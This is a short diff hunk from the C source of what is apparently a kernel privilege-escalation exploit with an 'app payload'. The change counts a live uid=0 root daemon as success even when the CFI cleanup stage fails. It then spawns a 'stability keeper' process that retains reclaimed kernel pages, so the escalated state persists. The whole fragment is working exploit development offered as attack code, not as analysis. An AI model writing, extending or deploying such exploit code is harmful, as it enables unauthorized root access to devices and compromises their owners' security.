@@ -610,7 +610,19 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
-  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
+  /*
+   * Root is the primary deliverable for the app payload.  The CFI cleanup
+   * and bookkeeping are still attempted above, but a cleanup-side miss must
+   * not hide a live uid=0 daemon that has already passed the socket check.
+   * This also prevents the supervisor from entering another physical route
+   * after the temporary root has been established.
+   */
+  int root_first_ok = root_child_done && root_uid_after == 0;
+  if (root_first_ok) {
+    pr_success("root-first verified uid=%u socket=ready cfi_cleanup=%d\n",
+               root_uid_after, atomic_load(&cfi_stage_done));
+  }
+  int exploit_ok = root_first_ok;
   if (exploit_ok) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
